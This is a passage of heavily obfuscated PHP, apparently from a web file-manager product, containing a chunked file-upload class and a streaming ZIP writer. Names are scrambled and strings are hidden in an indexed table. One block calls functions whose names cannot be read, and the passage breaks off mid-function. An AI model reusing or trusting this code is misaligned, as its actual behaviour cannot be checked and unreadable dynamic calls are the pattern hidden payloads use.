$e‚ÚÁÕìŸ[1653] => $e‚ÚÁÕìŸ[1654], $e‚ÚÁÕìŸ[1655] => $e‚ÚÁÕìŸ[1656], $e‚ÚÁÕìŸ[1657] => $e‚ÚÁÕìŸ[1658], $e‚ÚÁÕìŸ[1659] => $e‚ÚÁÕìŸ[1660], $e‚ÚÁÕìŸ[1661] => $e‚ÚÁÕìŸ[1662], $e‚ÚÁÕìŸ[1663] => $e‚ÚÁÕìŸ[1664], $e‚ÚÁÕìŸ[1665] => $e‚ÚÁÕìŸ[1666], $e‚ÚÁÕìŸ[1667] => array($e‚ÚÁÕìŸ[1668] => $e‚ÚÁÕìŸ[1669], $e‚ÚÁÕìŸ[1670] => $e‚ÚÁÕìŸ[1671], $e‚ÚÁÕìŸ[1672] => $e‚ÚÁÕìŸ[1673]), $e‚ÚÁÕìŸ[1674] => $e‚ÚÁÕìŸ[1675], $e‚ÚÁÕìŸ[1676] => $e‚ÚÁÕìŸ[1677], $e‚ÚÁÕìŸ[1678] => $e‚ÚÁÕìŸ[1679], $e‚ÚÁÕìŸ[1680] => $e‚ÚÁÕìŸ[1681], $e‚ÚÁÕìŸ[1682] => array($e‚ÚÁÕìŸ[1683] => $e‚ÚÁÕìŸ[1684], $e‚ÚÁÕìŸ[1685] => $e‚ÚÁÕìŸ[1686], $e‚ÚÁÕìŸ[1687] => $e‚ÚÁÕìŸ[1688], $e‚ÚÁÕìŸ[1689] => $e‚ÚÁÕìŸ[1690], $e‚ÚÁÕìŸ[1691] => $e‚ÚÁÕìŸ[1692], $e‚ÚÁÕìŸ[1693] => $e‚ÚÁÕìŸ[1694], $e‚ÚÁÕìŸ[1695] => $e‚ÚÁÕìŸ[1696], $e‚ÚÁÕìŸ[1697] => $e‚ÚÁÕìŸ[1698], $e‚ÚÁÕìŸ[1699] => $e‚ÚÁÕìŸ[1700], $e‚ÚÁÕìŸ[1701] => $e‚ÚÁÕìŸ[1702], $e‚ÚÁÕìŸ[1703] => $e‚ÚÁÕìŸ[1704]))), $e‚ÚÁÕìŸ[1705] => array($e‚ÚÁÕìŸ[160] => $e‚ÚÁÕìŸ[1706] . $e‚ÚÁÕìŸ[1707], $e‚ÚÁÕìŸ[1619] => array($e‚ÚÁÕìŸ[1623] => $e‚ÚÁÕìŸ[1708], $e‚ÚÁÕìŸ[187] => $e‚ÚÁÕìŸ[1709], $e‚ÚÁÕìŸ[107] => $e‚ÚÁÕìŸ[1710], $e‚ÚÁÕìŸ[1655] => $e‚ÚÁÕìŸ[1711], $e‚ÚÁÕìŸ[1712] => $e‚ÚÁÕìŸ[1713], $e‚ÚÁÕìŸ[1714] => $e‚ÚÁÕìŸ[1641], $e‚ÚÁÕìŸ[1715] => $e‚ÚÁÕìŸ[1716], $e‚ÚÁÕìŸ[1717] => $e‚ÚÁÕìŸ[1718], $e‚ÚÁÕìŸ[1719] => $e‚ÚÁÕìŸ[1720], $e‚ÚÁÕìŸ[1632] => array($e‚ÚÁÕìŸ[1343] => $e‚ÚÁÕìŸ[1721], $e‚ÚÁÕìŸ[1636] => $e‚ÚÁÕìŸ[1722], $e‚ÚÁÕìŸ[1637] => $e‚ÚÁÕìŸ[1723], $e‚ÚÁÕìŸ[1724] => $e‚ÚÁÕìŸ[1725], $e‚ÚÁÕìŸ[1726] => $e‚ÚÁÕìŸ[1727], $e‚ÚÁÕìŸ[1728] => $e‚ÚÁÕìŸ[1729], $e‚ÚÁÕìŸ[1615] => $e‚ÚÁÕìŸ[1730]))), $e‚ÚÁÕìŸ[1731] => array($e‚ÚÁÕìŸ[160] => $e‚ÚÁÕìŸ[1732] . $e‚ÚÁÕìŸ[1733], $e‚ÚÁÕìŸ[1619] => array($e‚ÚÁÕìŸ[1536] => $e‚ÚÁÕìŸ[1734], $e‚ÚÁÕìŸ[1538] => $e‚ÚÁÕìŸ[1735], $e‚ÚÁÕìŸ[1623] => $e‚ÚÁÕìŸ[1708], $e‚ÚÁÕìŸ[187] => $e‚ÚÁÕìŸ[1736], $e‚ÚÁÕìŸ[107] => $e‚ÚÁÕìŸ[1737], $e‚ÚÁÕìŸ[1642] => $e‚ÚÁÕìŸ[1738], $e‚ÚÁÕìŸ[1719] => $e‚ÚÁÕìŸ[1739], $e‚ÚÁÕìŸ[1715] => $e‚ÚÁÕìŸ[1740], $e‚ÚÁÕìŸ[1655] => $e‚ÚÁÕìŸ[1741], $e‚ÚÁÕìŸ[1705] => array($e‚ÚÁÕìŸ[1714] => $e‚ÚÁÕìŸ[1641], $e‚ÚÁÕìŸ[1742] => $e‚ÚÁÕìŸ[1743], $e‚ÚÁÕìŸ[1712] => $e‚ÚÁÕìŸ[1713], $e‚ÚÁÕìŸ[1719] => $e‚ÚÁÕìŸ[1720], $e‚ÚÁÕìŸ[1715] => $e‚ÚÁÕìŸ[1744], $e‚ÚÁÕìŸ[1717] => $e‚ÚÁÕìŸ[1718]))), $e‚ÚÁÕìŸ[1745] => array($e‚ÚÁÕìŸ[1619] => array($e‚ÚÁÕìŸ[1746] => $e‚ÚÁÕìŸ[1747], $e‚ÚÁÕìŸ[1748] => $e‚ÚÁÕìŸ[1749])), $e‚ÚÁÕìŸ[1750] => array($e‚ÚÁÕìŸ[1619] => array())); } } function exif_read_data_io($b× İ´¦¥, $f³œÕçËŞ‚ = null, $C®¯‡áÜÈ = false, $aÙºÛô¾À = false) { $bÑĞÖõ‰­ = StreamWrapperIO::read($b× İ´¦¥, 0, 1024 * 64); $CŸµ‚õğÈ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1751] . base64_encode($bÑĞÖõ‰­); return exif_read_data($CŸµ‚õğÈ, $f³œÕçËŞ‚, $C®¯‡áÜÈ, $aÙºÛô¾À); } function getimagesize_io($CÛŸ®’¯è¦, &$F¤Š‰·Ï£ = false) { $D¢ªôŠ”‰ = StreamWrapperIO::read($CÛŸ®’¯è¦, 0, 1024 * 64); $CÛŸ®’¯è¦ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1751] . base64_encode($D¢ªôŠ”‰); return getimagesize($CÛŸ®’¯è¦, $F¤Š‰·Ï£); } goto A’ğœòôíŒ; E†‰£Ìî­¼: if ($_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][703]] != $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][704]]) { goto E‰Ûïêä; E‰Ûïêä: $Bï±‰¹£ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][705]; $BÊà°†Ê§Ğ = $_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][706]] . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][707]; $dô†‹ÊÁ§ô = $Bï±‰¹£($BÊà°†Ê§Ğ); goto C¨Ø½×¬È; A†îˆãõ‹®: $eá…½Œœ‘($_SERVER[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][710]]); goto Fë¶ªÙ»; C¨Ø½×¬È: $A‘¶äèÛË¹ = explode($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][217], $dô†‹ÊÁ§ô); if (count($A‘¶äèÛË¹) < $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][562]) { $Eø‹¾ë˜ÙÔ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][708]; $Eø‹¾ë˜ÙÔ(); } $eá…½Œœ‘ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][709]; goto A†îˆãõ‹®; Fë¶ªÙ»: } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto FÔÙ¬İ°°ƒ; DôÉ‚ÚÕß: if (!empty($_FILES)) { $bäÌ ó‹È = $_FILES[$a–ÉƒÁ©Á‘[167]]; $this->uploadFile = $bäÌ ó‹È[$a–ÉƒÁ©Á‘[1970]]; if (!$this->uploadFile && $bäÌ ó‹È[$a–ÉƒÁ©Á‘[1218]] > 0) { show_json($this->errorInfo($bäÌ ó‹È[$a–ÉƒÁ©Á‘[1218]]), !1); } } else { if (isset($in[$a–ÉƒÁ©Á‘[386]])) { $this->uploadFile = isset($in[$a–ÉƒÁ©Á‘[1971]]) ? $a–ÉƒÁ©Á‘[1972] : $a–ÉƒÁ©Á‘[1815]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto aàŠ ÁôÕ; aàŠ ÁôÕ: $this->checkSize(); $this->tempPathInit(); goto aÅ¡†“ÍĞ¨; FÔÙ¬İ°°ƒ: $a–ÉƒÁ©Á‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $in; $this->in =& $in; goto DôÉ‚ÚÕß; aÅ¡†“ÍĞ¨: } public function upload() { goto aÁ·ÁĞ; C†ÎÏïÖ¬: CacheLock::lock($this->tempFile, 20); $a÷±„ÚÖ• = $this->statusGet(); $this->initFileTemp(); goto c¥†£Õç¨Ë; aÁ·ÁĞ: $bÓî¾ÍèºÆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f‘ª…×Ôå = isset($this->in[$bÓî¾ÍèºÆ[1973]]) ? intval($this->in[$bÓî¾ÍèºÆ[1973]]) : 0; $cäƒ‹„í·³ = isset($this->in[$bÓî¾ÍèºÆ[1974]]) ? intval($this->in[$bÓî¾ÍèºÆ[1974]]) : 1; goto béé¾…ø‡Ê; f±¦š¥“¸»: CacheLock::unlock($this->tempFile); return $this->tempFile; goto cœğ³Ş‘ õ; AËŒƒŞ–¨: $a÷±„ÚÖ•[$bÓî¾ÍèºÆ[1983]][$bÓî¾ÍèºÆ[1984] . $f‘ª…×Ôå] = array($bÓî¾ÍèºÆ[1985] => $E²ÔŒÂ·¨, $bÓî¾ÍèºÆ[1033] => $f‘ª…×Ôå, $bÓî¾ÍèºÆ[77] => $c÷ß°¡óÛ, $bÓî¾ÍèºÆ[164] => $c‹Ï×·´ ›); $this->statusSet($a÷±„ÚÖ•); if (count($a÷±„ÚÖ•[$bÓî¾ÍèºÆ[1983]]) != $a÷±„ÚÖ•[$bÓî¾ÍèºÆ[1982]]) { $this->showJson($bÓî¾ÍèºÆ[1986] . $f‘ª…×Ôå, !0); } goto f¡¦Â±Èæ½; E‘¯¶‰¡ˆÓ: @unlink($DÕÆ„Ã”¨Ê); if (!$b”è»Ôªæõ) { $this->showJson($bÓî¾ÍèºÆ[1981] . $f‘ª…×Ôå, !1); } $a÷±„ÚÖ•[$bÓî¾ÍèºÆ[1982]] = $cäƒ‹„í·³; goto AËŒƒŞ–¨; D–Å¥ëŞ‘ƒ: $b”è»Ôªæõ = $this->writeTo($DÕÆ„Ã”¨Ê, $fëÉ‘Ë• í, $this->tempFile); $c‹Ï×·´ › = IO::hashSimple($DÕÆ„Ã”¨Ê); $c÷ß°¡óÛ = IO::size($DÕÆ„Ã”¨Ê); goto E‘¯¶‰¡ˆÓ; aÁ­‡¼‡ªØ: $E²ÔŒÂ·¨ = $f‘ª…×Ôå * $EØÉ—«‡Ç; $fëÉ‘Ë• í = @fopen($this->tempFile, $bÓî¾ÍèºÆ[1980]); fseek($fëÉ‘Ë• í, $E²ÔŒÂ·¨); goto D–Å¥ëŞ‘ƒ; f¡¦Â±Èæ½: ignore_timeout(); if (!$this->checkChunkHash($a÷±„ÚÖ•)) { $this->showJson($bÓî¾ÍèºÆ[1987], !1); } $this->statusSet(!1); goto f±¦š¥“¸»; béé¾…ø‡Ê: $D©ˆÚâŒÚ = $this->tempFile . $bÓî¾ÍèºÆ[1975] . $f‘ª…×Ôå; $c÷ß°¡óÛ = isset($this->in[$bÓî¾ÍèºÆ[522]]) ? intval($this->in[$bÓî¾ÍèºÆ[522]]) : 0; $EØÉ—«‡Ç = isset($this->in[$bÓî¾ÍèºÆ[1976]]) ? intval($this->in[$bÓî¾ÍèºÆ[1976]]) : 0; goto bÚÍ›„®ƒ£; c¥†£Õç¨Ë: $DÕÆ„Ã”¨Ê = $this->moveUploadedFile($D©ˆÚâŒÚ); if ($c÷ß°¡óÛ > 0 && filesize($DÕÆ„Ã”¨Ê) == 0) { $this->showJson($bÓî¾ÍèºÆ[1978], !1); } if (!$DÕÆ„Ã”¨Ê) { $this->showJson(LNG($bÓî¾ÍèºÆ[1979]), !1); } goto aÁ­‡¼‡ªØ; bÚÍ›„®ƒ£: if ($cäƒ‹„í·³ > 1 && $EØÉ—«‡Ç <= 0) { show_json($bÓî¾ÍèºÆ[1977], !1); } if ($EØÉ—«‡Ç > $c÷ß°¡óÛ) { $cäƒ‹„í·³ = 1; } if ($cäƒ‹„í·³ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto C†ÎÏïÖ¬; cœğ³Ş‘ õ: } private function checkSize() { $A²Ù³ÊÂĞ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (phpBuild64() || $this->in[$A²Ù³ÊÂĞ[77]] < PHP_INT_MAX) { return; } show_json(LNG($A²Ù³ÊÂĞ[1988]), !1); } private function showJson($DŠ…ùÙô‘©, $BŒÛªºèô) { CacheLock::unlock($this->tempFile); if (!$BŒÛªºèô) { return show_json($DŠ…ùÙô‘©, $BŒÛªºèô); } show_json($DŠ…ùÙô‘©, $BŒÛªºèô); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto eõï‹Ø¹ÃÆ; eõï‹Ø¹ÃÆ: $fŠœŠèƒÊ­ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f°É™ÇÃÇ = TEMP_FILES; @mk_dir($f°É™ÇÃÇ); goto B•¡–÷ñÖ; B•¡–÷ñÖ: touch($f°É™ÇÃÇ . $fŠœŠèƒÊ­[1989]); $AÃ¦Úâ²Ì² = isset($this->in[$fŠœŠèƒÊ­[1990]]) ? $this->in[$fŠœŠèƒÊ­[1990]] : !1; if (strlen($AÃ¦Úâ²Ì²) < 30) { $AÃ¦Úâ²Ì² = md5(USER_ID . $this->in[$fŠœŠèƒÊ­[75]] . $this->fileName . $this->in[$fŠœŠèƒÊ­[77]]); } goto B‰œßŸ·ë·; B‰œßŸ·ë·: $this->tempFile = $f°É™ÇÃÇ . $fŠœŠèƒÊ­[1991] . md5($AÃ¦Úâ²Ì² . $this->in[$fŠœŠèƒÊ­[1532]]); goto BÚÒ‰îœ®ê; BÚÒ‰îœ®ê: } private function moveUploadedFile($B³ø¯óÍ) { $dìÄ·«…š =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cêö¯†ÛİÃ = $this->uploadFile; if ($cêö¯†ÛİÃ == $dìÄ·«…š[1992]) { @file_put_contents($B³ø¯óÍ, base64_decode($_REQUEST[$dìÄ·«…š[1993]])); } else { if ($cêö¯†ÛİÃ == $dìÄ·«…š[1815]) { $B±ãĞä¦ŒÜ = @fopen($B³ø¯óÍ, $dìÄ·«…š[1522]); $this->writeTo($cêö¯†ÛİÃ, $B±ãĞä¦ŒÜ, $B³ø¯óÍ); } else { if (!move_uploaded_file($cêö¯†ÛİÃ, $B³ø¯óÍ)) { return !1; } } } return $B³ø¯óÍ; } private function writeTo($B†¼½¶‘ÆÕ, $c®ÊßôÖÊÊ, $a‹•¡ƒ‹¾) { goto A £İ­İª¦; FôÖ§Îóİö: return !0; goto Fï¨Š«‡£î; A £İ­İª¦: $d¿ØŞ´Î·’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FÃºÚğ·İŞ = $d¿ØŞ´Î·’[1994] . $a‹•¡ƒ‹¾; $aƒŞíºóô = CacheLock::lock($FÃºÚğ·İŞ, 1); goto fÍ¥Õç–É; A˜Õ£”ŸŠÓ: fclose($FÃÔÜí¦‡š); fclose($c®ÊßôÖÊÊ); CacheLock::unlock($FÃºÚğ·İŞ); goto FôÖ§Îóİö; fÍ¥Õç–É: $FÃÔÜí¦‡š = @fopen($B†¼½¶‘ÆÕ, $d¿ØŞ´Î·’[1521]); if (!$FÃÔÜí¦‡š || !$c®ÊßôÖÊÊ || !$aƒŞíºóô) { CacheLock::unlock($FÃºÚğ·İŞ); return !1; } while (!feof($FÃÔÜí¦‡š)) { fwrite($c®ÊßôÖÊÊ, fread($FÃÔÜí¦‡š, 1024 * 200)); } goto A˜Õ£”ŸŠÓ; Fï¨Š«‡£î: } private function statusGet() { goto BÜ£­•«Äí; d±¦ùè‚‚: if (!$this->statusData) { $BÅÈÁ°öé¬ = array($a¹¯¥²‘¢à[28] => $this->fileName, $a¹¯¥²‘¢à[1982] => 0, $a¹¯¥²‘¢à[1983] => array()); $this->statusSet($BÅÈÁ°öé¬); } return $this->statusData; goto dé’Ü¦Êµà; BÜ£­•«Äí: $a¹¯¥²‘¢à =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (is_array($this->statusData)) { return $this->statusData; } $b¬¤¥„Ï¢î = $this->tempFile . $a¹¯¥²‘¢à[1995]; goto e‡çÔ½™; e‡çÔ½™: $AÚõÃä£œ = !1; if (file_exists($b¬¤¥„Ï¢î)) { $AÚõÃä£œ = @file_get_contents($b¬¤¥„Ï¢î); } if ($AÚõÃä£œ) { $this->statusData = json_decode($AÚõÃä£œ, !0); } goto d±¦ùè‚‚; dé’Ü¦Êµà: } public function statusSet($fŠĞ‹§ÀË) { $Eë‚é¾ÚğŸ = $this->tempFile . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1995]; if (!$fŠĞ‹§ÀË) { if (file_exists($Eë‚é¾ÚğŸ)) { @unlink($Eë‚é¾ÚğŸ); } return !0; } $this->statusData = $fŠĞ‹§ÀË; return file_put_contents($Eë‚é¾ÚğŸ, json_encode($fŠĞ‹§ÀË)); } private function initFileTemp() { $a—¤å”§Ø³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (file_exists($this->tempFile)) { return; } $e¤è»¼“À™ = fopen($this->tempFile, $a—¤å”§Ø³[1996]); fseek($e¤è»¼“À™, $this->in[$a—¤å”§Ø³[77]] - 1, SEEK_SET); fwrite($e¤è»¼“À™, $a—¤å”§Ø³[470]); fclose($e¤è»¼“À™); } public function checkChunk() { goto B“«§Œˆ³„; Aäˆ¸™ˆ: $d š„Çì±ø = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($d š„Çì±ø[$CùĞÚ˜ï©[1983]] as $A‘˜†Ò‰Ş) { $FÕñ¡©Ü˜º = $A‘˜†Ò‰Ş[$CùĞÚ˜ï©[164]]; if ($FÕñ¡©Ü˜º) { $d–˜Œ’ö®ù[$CùĞÚ˜ï©[1997] . $A‘˜†Ò‰Ş[$CùĞÚ˜ï©[1033]]] = $FÕñ¡©Ü˜º; } } goto A¶­Ëß›í; B“«§Œˆ³„: $CùĞÚ˜ï© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d–˜Œ’ö®ù = array(); CacheLock::lock($this->tempFile); goto Aäˆ¸™ˆ; A¶­Ëß›í: return $d–˜Œ’ö®ù; goto D–‹¹ñ˜à; D–‹¹ñ˜à: } private function checkChunkHash($B¹Ô¼Ô®òÄ) { goto F¦‰Á•»£; b¾ğÑ¯¨¦: $fŒéÏ³ŒÎ— = !0; foreach ($B¹Ô¼Ô®òÄ[$Dï§°Ÿœ¯Ô[1983]] as $f•ğ¥åç£§) { fseek($eˆôğ³¤, $f•ğ¥åç£§[$Dï§°Ÿœ¯Ô[1985]]); $E“ËÚ¶ñ = PathDriverStream::hash($eˆôğ³¤, $f•ğ¥åç£§[$Dï§°Ÿœ¯Ô[77]]); if ($f•ğ¥åç£§[$Dï§°Ÿœ¯Ô[164]] != $E“ËÚ¶ñ) { $fŒéÏ³ŒÎ— = !1; break; } } fclose($eˆôğ³¤); goto F…½ºö‹Ï; F¦‰Á•»£: $Dï§°Ÿœ¯Ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (count($B¹Ô¼Ô®òÄ[$Dï§°Ÿœ¯Ô[1983]]) != $B¹Ô¼Ô®òÄ[$Dï§°Ÿœ¯Ô[1982]]) { return !1; } $f˜Ø´á··Ú = _get($this->in, $Dï§°Ÿœ¯Ô[1990]); goto D’Å’­£Ñ; F…½ºö‹Ï: return $fŒéÏ³ŒÎ—; goto bñÙÓØ§—Ç; D’Å’­£Ñ: $cÅùèÎÚŠ¨ = _get($this->in, $Dï§°Ÿœ¯Ô[1998]); if (strlen($cÅùèÎÚŠ¨) == 32 && IO::hashSimple($this->tempFile) == $f˜Ø´á··Ú && IO::hashMd5($this->tempFile) == $cÅùèÎÚŠ¨) { return !0; } $eˆôğ³¤ = fopen($this->tempFile, $Dï§°Ÿœ¯Ô[1169]); goto b¾ğÑ¯¨¦; bñÙÓØ§—Ç: } public static function fileName() { goto B§öéÏ‰; CËÔ¨é©İ•: if (!empty($_FILES)) { $F±½“³ßÅ = $F±½“³ßÅ ? $F±½“³ßÅ : $_FILES[$B·®µ¡Òñ[167]][$B·®µ¡Òñ[386]]; } if (!is_wap()) { return KodIO::clear($F±½“³ßÅ); } $f²í¡í”± = strtotime($in[$B·®µ¡Òñ[1999]]); goto fùÓÙÊ¤Š¯; fùÓÙÊ¤Š¯: $f²í¡í”± = $f²í¡í”± ? $f²í¡í”± : time(); $E»ºõÂÕæ = strtolower($F±½“³ßÅ); if ($E»ºõÂÕæ == $B·®µ¡Òñ[2000] || $E»ºõÂÕæ == $B·®µ¡Òñ[2001]) { $F±½“³ßÅ = date($B·®µ¡Òñ[684], $f²í¡í”±) . $B·®µ¡Òñ[70] . $in[$B·®µ¡Òñ[77]] . $B·®µ¡Òñ[1629]; } else { if ($E»ºõÂÕæ == $B·®µ¡Òñ[2002]) { $F±½“³ßÅ = date($B·®µ¡Òñ[684], $f²í¡í”±) . $B·®µ¡Òñ[70] . $in[$B·®µ¡Òñ[77]] . $B·®µ¡Òñ[2003]; } } goto DŞ¥™£¼ï§; DŞ¥™£¼ï§: return KodIO::clear($F±½“³ßÅ); goto cŞøšôÑ¶˜; B§öéÏ‰: $B·®µ¡Òñ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; global $in; $F±½“³ßÅ = isset($in[$B·®µ¡Òñ[28]]) ? $in[$B·®µ¡Òñ[28]] : $B·®µ¡Òñ[33]; goto CËÔ¨é©İ•; cŞøšôÑ¶˜: } private function errorInfo($dÊŞ­ÄçêÇ) { $F¸ñÍÓ¼‰„ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bÛ¦«Ç¢³ = array($F¸ñÍÓ¼‰„[2004], $F¸ñÍÓ¼‰„[2005], $F¸ñÍÓ¼‰„[2006], $F¸ñÍÓ¼‰„[2007], $F¸ñÍÓ¼‰„[2008], $F¸ñÍÓ¼‰„[2009], $F¸ñÍÓ¼‰„[2010], $F¸ñÍÓ¼‰„[2011]); return $dÊŞ­ÄçêÇ . $F¸ñÍÓ¼‰„[4] . $bÛ¦«Ç¢³[$dÊŞ­ÄçêÇ]; } } class ZipMake { const VERSION = "\x30\56\x32\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($BàÍÂÒáùì = null) { $bÅùã¨’Í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $this->outputStream = fopen($bÅùã¨’Í[2012], $bÅùã¨’Í[1225]); $this->outputName = $BàÍÂÒáùì; $this->needHeaders = !0; } public function addFile($aÀÍš‚¶‚Á, $dÛ·¾¹”Âå) { goto bî¤íÙ‡ï; fîÌƒİ²áË: $this->addFileFooter($aÀÍš‚¶‚Á, $fŞš´šå±ˆ, $AµÚç‡ˆ‹, $C…É¶îŞˆ, $c¢¾è®ÑÇ, $fÆùßƒªğˆ); goto A¦ø˜¡àæ„; bÙ’Æë†§: while (!feof($bºÏê¤ß Õ)) { $f½Ö¥‘œØŠ = fread($bºÏê¤ß Õ, 1048576); $this->send($f½Ö¥‘œØŠ); } fclose($bºÏê¤ß Õ); $AµÚç‡ˆ‹ = hexdec(hash_file($B¦™ÎáÚ‘©[2014], $dÛ·¾¹”Âå)); goto fîÌƒİ²áË; FÏ¥’¶ê‰¼: $fÆùßƒªğˆ = $this->addFileHeader($aÀÍš‚¶‚Á, $fŞš´šå±ˆ); $C…É¶îŞˆ = $c¢¾è®ÑÇ = filesize($dÛ·¾¹”Âå); $bºÏê¤ß Õ = fopen($dÛ·¾¹”Âå, $B¦™ÎáÚ‘©[2013]); goto bÙ’Æë†§; bî¤íÙ‡ï: $B¦™ÎáÚ‘© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $aÀÍš‚¶‚Á = $this->filterFilename($aÀÍš‚¶‚Á); $fŞš´šå±ˆ = static::METHOD_STORE; goto FÏ¥’¶ê‰¼; A¦ø˜¡àæ„: } public function addFileFromStream($A°…„“Ğ‚ß, $bĞÔÛÈ¾¤„) { goto b±ùàª£; b±ùàª£: $A°…„“Ğ‚ß = $this->filterFilename($A°…„“Ğ‚ß); $Dİ°ØßÁ”‰ = static::METHOD_STORE; $Bòİ„Â®¨ = $this->addFileHeader($A°…„“Ğ‚ß, $Dİ°ØßÁ”‰); goto DõÃ©óµÁõ; ağ“ÌåÄ: $this->addFileFooter($A°…„“Ğ‚ß, $Dİ°ØßÁ”‰, $Eè®¿¬ÊÌ, $fİñÕ¢¯Ì‹, $c¨Ù„Ìá–Œ, $Bòİ„Â®¨); goto FÇÌ… Š; C…¦ñÜÀœÍ: $bÙŸ˜îºÕ¦ = hash_init($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][2014]); while (!feof($bĞÔÛÈ¾¤„)) { $e÷£à©¥Şä = fread($bĞÔÛÈ¾¤„, 1048576); hash_update($bÙŸ˜îºÕ¦, $e÷£à©¥Şä); $this->send($e÷£à©¥Şä); } $Eè®¿¬ÊÌ = hexdec(hash_final($bÙŸ˜îºÕ¦)); goto ağ“ÌåÄ; DõÃ©óµÁõ: fseek($bĞÔÛÈ¾¤„, 0, SEEK_END); $fİñÕ¢¯Ì‹ = $c¨Ù„Ìá–Œ = ftell($bĞÔÛÈ¾¤„); rewind($bĞÔÛÈ¾¤„); goto C…¦ñÜÀœÍ; FÇÌ… Š: } public function finish() { foreach ($this->files as $BÓÛ×¢ÄËƒ) { $this->addCdrFile($BÓÛ×¢ÄËƒ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($fÇÁØ£Ô‘, $D®î„åš“) { goto CéŞ—ä­¡˜; aõ¹›ê¬ÄÚ: $d™¥ËÆŠšŞ = $this->packFields($båå‹­å); $A¹ÈË–Ë‡ = $this->packFields($bµ›†ïõ¢); $this->send($d™¥ËÆŠšŞ . $fÇÁØ£Ô‘ . $A¹ÈË–Ë‡); goto Bãó‘­ÎÃ£; f‹¢‹ÁìÁ: $F½Œ¨›‰Ëİ = $this->dosTime(time()); $båå‹­å = array(array($FƒŠĞ¸¢½[2016], static::FILE_HEADER_SIGNATURE), array($FƒŠĞ¸¢½[2017], static::ZIP_VERSION_64), array($FƒŠĞ¸¢½[2017], 8), array($FƒŠĞ¸¢½[2017], $D®î„åš“), array($FƒŠĞ¸¢½[2016], $F½Œ¨›‰Ëİ), array($FƒŠĞ¸¢½[2016], 0), array($FƒŠĞ¸¢½[2016], 4294967295), array($FƒŠĞ¸¢½[2016], 4294967295), array($FƒŠĞ¸¢½[2017], $cÈÜŒ¹îôÁ), array($FƒŠĞ¸¢½[2017], 32)); $bµ›†ïõ¢ = array(array($FƒŠĞ¸¢½[2017], 1), array($FƒŠĞ¸¢½[2017], 28), array($FƒŠĞ¸¢½[2018], 0), array($FƒŠĞ¸¢½[2018], 0), array($FƒŠĞ¸¢½[2018], 0), array($FƒŠĞ¸¢½[2016], 0)); goto aõ¹›ê¬ÄÚ; CéŞ—ä­¡˜: $FƒŠĞ¸¢½ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÇÁØ£Ô‘ = preg_replace($FƒŠĞ¸¢½[2015], $FƒŠĞ¸¢½[33], $fÇÁØ£Ô‘); $cÈÜŒ¹îôÁ = strlen($fÇÁØ£Ô‘); goto f‹¢‹ÁìÁ; Bãó‘­ÎÃ£: return strlen($d™¥ËÆŠšŞ) + $cÈÜŒ¹îôÁ + strlen($A¹ÈË–Ë‡); goto D«„ƒçêÖ; D«„ƒçêÖ: } protected function addFileFooter($aÜœ¿…¶ÆŠ, $C® «‹»ØÈ, $b…¦ùÃ¹Ãñ, $D‹º¸ğ, $CÁ£É¬Ã÷„, $F—Àñíñä‘) { $b…ÏÚ„ÂÃ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $A¢½Çœ›ù½ = array(array($b…ÏÚ„ÂÃ[2016], static::DATA_DESCRIPTOR_SIGNATURE), array($b…ÏÚ„ÂÃ[2016], $b…¦ùÃ¹Ãñ), array($b…ÏÚ„ÂÃ[2018], $D‹º¸ğ), array($b…ÏÚ„ÂÃ[2018], $CÁ£É¬Ã÷„)); $A¥°Â¹ËšÄ = $this->packFields($A¢½Çœ›ù½); $this->send($A¥°Â¹ËšÄ); $c¿áŒÃì±ö = $F—Àñíñä‘ + $D‹º¸ğ + $Eè´Ëè¡¡¿; $this->addToCdr($aÜœ¿…¶ÆŠ, $C® «‹»ØÈ, $b…¦ùÃ¹Ãñ, $D‹º¸ğ, $CÁ£É¬Ã÷„, $c¿áŒÃì±ö); } private function addToCdr($EÎ÷£à‰á, $BµÙÈ›´Š, $béó½åŒ, 